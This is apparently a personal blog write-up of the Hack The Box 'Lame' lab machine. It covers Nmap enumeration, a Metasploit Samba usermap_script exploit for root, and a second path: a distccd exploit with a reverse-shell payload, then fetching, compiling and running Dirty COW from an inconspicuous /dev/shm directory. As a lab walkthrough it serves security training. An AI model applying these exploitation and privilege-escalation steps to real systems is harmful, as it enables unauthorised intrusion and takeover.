---
title:     "Hack The Box - Lame"
tags: [HackTheBox,Linux,Easy,CVE]
layout: post
categories: HackTheBox-Writeups
---
![](/images/HTB/Lame/lame.png)


# Introduction
Hello world! Err, perhaps hello Hack The Box as this was the first box they published. As such, I completed this box for the first time a few years ago. I thought as I revisited this box to make this writeup it would be interesting to see if I could find anything new from when I initially rooted the machine, and to my delight I found a second path to root. There are actually more ways than what I have written here, and if you are reading this and just starting out I challenge you to find some other ways to get root!

# Initial Enumeration 
As always we start with an Nmap scan to see what ports are open.

## Nmap scan

```
# Nmap 7.91 scan initiated Thu Apr  1 17:24:31 2021 as: nmap -vv -T3 -O -Pn -p T:21,22,139,445,3632 -sV --script=default,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,smb-enum-shares.nse,smb-vuln-ms17-010.nse,smb-enum-users.nse,smb-double-pulsar-backdoor.nse,smb2-vuln-uptime.nse -oN /storage/HackTheBox/Lame/nmap/vuln_10.10.10.3.nmap 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.0095s latency).
Scanned at 2021-04-01 17:24:32 EDT for 73s

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|remote management|printer|general purpose
Running (JUST GUESSING): Linux 2.4.X|2.6.X (92%), Dell embedded (92%), Linksys embedded (92%), Tranzeo embedded (92%), Xerox embedded (92%), Dell iDRAC 6 (92%)
OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/h:dell:remote_access_card:6 cpe:/h:linksys:wet54gs5 cpe:/h:tranzeo:tr-cpq-19f cpe:/h:xerox:workcentre_pro_265 cpe:/o:linux:linux_kernel:2.6 cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:2.6.22
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Linksys WRV54G WAP (92%), DD-WRT v24-sp1 (Linux 2.4.36) (91%), Linux 2.4.7 (91%), Linux 2.6.23 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=4/1%OT=21%CT=%CU=%PV=Y%G=N%TM=60663A59%P=x86_64-pc-linux-gnu)
SEQ(SP=B9%GCD=1%ISR=CC%TI=Z%II=I%TS=7)
OPS(O1=M54DST11NW5%O2=M54DST11NW5%O3=M54DNNT11NW5%O4=M54DST11NW5%O5=M54DST11NW5%O6=M54DST11)
WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)
ECN(R=Y%DF=Y%TG=40%W=16D0%O=M54DNNSNW5%CC=N%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 497.102 days (since Thu Nov 21 13:58:42 2019)
TCP Sequence Prediction: Difficulty=184 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h14m24s, deviation: 2h49m43s, median: 14m23s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 32285/tcp): CLEAN (Timeout)
|   Check 3 (port 8614/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.10.10.3\ADMIN$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.10.10.3\IPC$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.10.10.3\opt: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.10.10.3\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|   \\10.10.10.3\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
| smb-enum-users: 
|   LAME\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Account disabled, Normal user account
|   LAME\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Account disabled, Normal user account
|   LAME\bind (RID: 1210)
|     Flags:       Account disabled, Normal user account
|   LAME\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Account disabled, Normal user account
|   LAME\dhcp (RID: 1202)
|     Flags:       Account disabled, Normal user account
|   LAME\distccd (RID: 1222)
|     Flags:       Account disabled, Normal user account
|   LAME\ftp (RID: 1214)
|     Flags:       Account disabled, Normal user account
|   LAME\games (RID: 1010)
|     Full name:   games
|     Flags:       Account disabled, Normal user account
|   LAME\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Account disabled, Normal user account
|   LAME\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Account disabled, Normal user account
|   LAME\klog (RID: 1206)
|     Flags:       Account disabled, Normal user account
|   LAME\libuuid (RID: 1200)
|     Flags:       Account disabled, Normal user account
|   LAME\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Account disabled, Normal user account
|   LAME\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Account disabled, Normal user account
|   LAME\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Account disabled, Normal user account
|   LAME\man (RID: 1012)
|     Full name:   man
|     Flags:       Account disabled, Normal user account
|   LAME\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   LAME\mysql (RID: 1218)
|     Full name:   MySQL Server,,,
|     Flags:       Account disabled, Normal user account
|   LAME\news (RID: 1018)
|     Full name:   news
|     Flags:       Account disabled, Normal user account
|   LAME\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Account disabled, Normal user account
|   LAME\postfix (RID: 1212)
|     Flags:       Account disabled, Normal user account
|   LAME\postgres (RID: 1216)
|     Full name:   PostgreSQL administrator,,,
|     Flags:       Account disabled, Normal user account
|   LAME\proftpd (RID: 1226)
|     Flags:       Account disabled, Normal user account
|   LAME\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Account disabled, Normal user account
|   LAME\root (RID: 1000)
|     Full name:   root
|     Flags:       Account disabled, Normal user account
|   LAME\service (RID: 3004)
|     Full name:   ,,,
|     Flags:       Account disabled, Normal user account
|   LAME\sshd (RID: 1208)
|     Flags:       Account disabled, Normal user account
|   LAME\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Account disabled, Normal user account
|   LAME\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Account disabled, Normal user account
|   LAME\syslog (RID: 1204)
|     Flags:       Account disabled, Normal user account
|   LAME\telnetd (RID: 1224)
|     Flags:       Account disabled, Normal user account
|   LAME\tomcat55 (RID: 1220)
|     Flags:       Account disabled, Normal user account
|   LAME\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   LAME\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Account disabled, Normal user account
|   LAME\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Account disabled, Normal user account
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-04-01T17:39:12-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  1 17:25:45 2021 -- 1 IP address (1 host up) scanned in 74.16 seconds
```

## FTP
  There are two things that stand out with the results from port 21. One is that the server allows anonymous login. The second is that it is running VSFTPD 2.3.4. That particular version is known to have a backdoor where having a smiley face ":)" in the username will open up port 6200 which gives the person who connects to it a shell. My Nmap script automatically runs "ftp-vsftpd-backdoor.nse" when it detects port 21 is open, so I was sure that it was not vulnerable to this exploit.
  
  
  We do have anonymous login to the FTP server, however if there were and files or directories Nmap would have displayed them. Regardless we can log in just to make sure and do find that there is nothing there.
  
![](/images/HTB/Lame/ftp.png)
 
 
  
## SMB
  Ports 139/445 show us that SMB is running on the system, specifically version 3.0.20 as noted from our Nmap scan. Googling for "smb 3.0.20" by itself starts bringing up exploits so there is a good chance that this is our way in. We see that Rapid7 has an exploit in metasploit so let's load up msfconsole and run their exploit.
  
# Getting a ~~User~~ Root Shell
  We can start up metasploit by running `msfconsole` and use the script by typing `use exploit/multi/samba/usermap_script` per their instructions.

![](/images/HTB/Lame/usermap_options.png)
  
  Looking at the options there isn't much for us to set. We only need to set the rhosts to the IP of lame (10.10.10.3) and make sure that our lhost is on the proper interface which was selected wrong.
  
  
  
  ```
  rhosts 10.10.10.3  
  lhost tun0
  ```
  
  
  Type 'run' and .... Oh. We're root. Doesn't get much easier than that.
  
![](/images/HTB/Lame/initial_root.png)
  
  After some quick searching we find the user flag in the 'makis' user directory and the root flag in the usual spot.
![](/images/HTB/Lame/flags.png)
  
# Bonus
  There was one more port that showed up in the Nmap scan that we did not look at, port 3632 or the distccd service. Once again googling this service brings up an exploit from Rapid7. The information on the Rapid7 page says that this will run on "any system running distccd" however the CVE says version 2.x. Our Nmap scan shows us that the system is running v1 which is obviously older than 2.x so running this may be worth a shot. Let's fire up metasploit and load the exploit. A quick look at the options shows we only have to set the rhosts, so let's do that and run it.
  
![](/images/HTB/Lame/distccd_nopayload.png)

metasploit tells us that the exploit failed due to no payload being set, so let's set one! We can type `set payload ` and hit `tab` twice to see the available payloads. Let's go with a basic reverse shell.

`set payload cmd/unix/reverse`

Since we are getting a shell back to us we will need to set the lhost now as well. Once we have all of that set it is time to run it.

![](/images/HTB/Lame/distccd_setpayload.png)

And look at that, we now have a shell as daemon!

![](/images/HTB/Lame/daemon_shell.png)


## Getting root
So now what? We could pull over a script like LinPEAS but let's do a little bit of manual enumeration first. A quick look at the system information (uname -a) shows us it is running linux kernel 2.6.24-16-server. Another quick google brings up the dirty cow exploit and our kernel version falls within the exploitable versions, so let's give that a shot. 

Although the first link that comes up is exploitdb, there are a bunch of PoCs available for dirty cow on github. It turns out the one on exploitdb is the one we want though. We see that for this exploit we will need to compile the exploit with `gcc` and checking the machine with `which gcc` we see that it is installed. We can copy the raw code into a new file on our machine and name it dirty.c. 

Now to get the code onto the target. We can start a simple python server with `python3 -m http.server` which will make this file easily accessible. Back on the target machine we should change into a directory that is a bit less conspicuous and one that we can write to. I like to use `/dev/shm` as this is actually in memory so if the machine reboots it is wiped out. Of course this being Hack The Box if the machine reboots it will get wiped out anyway, but it's best to practice.

Now we can pull down the `dirty.c` file we created on our machine using `wget`.

![](/images/HTB/Lame/wget.png)


Now all we have to do is follow the compile instructions:  
`gcc -pthread dirty.c -o dirty -lcrypt`

Doing this does not show any errors which is a good sign. Continuing to follow the instructions all we have to do is run the file with our new password as an argument.

`./dirty password`

At this point I had no more response from my shell. I could still ping the box so it appeared to be up. The instructions say that once the exploit is complete we should either `su` to user firefart or we can log in with SSH as firefart. Let's see what happens if we try to ssh into the box.

![](/images/HTB/Lame/firefart_root.png)


Look at that, we are root.

Boom.


# References   
- [Escaping Metasploit – vsFTPd 2.3.4 – UHWO Cyber Security](https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/)
- [CVExplained - CVE-2007-2447 - Exploit Development - 0x00sec - The Home of the Hacker](https://0x00sec.org/t/cvexplained-cve-2007-2447/22748)
- [PoCs · dirtycow/dirtycow.github.io Wiki · GitHub](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
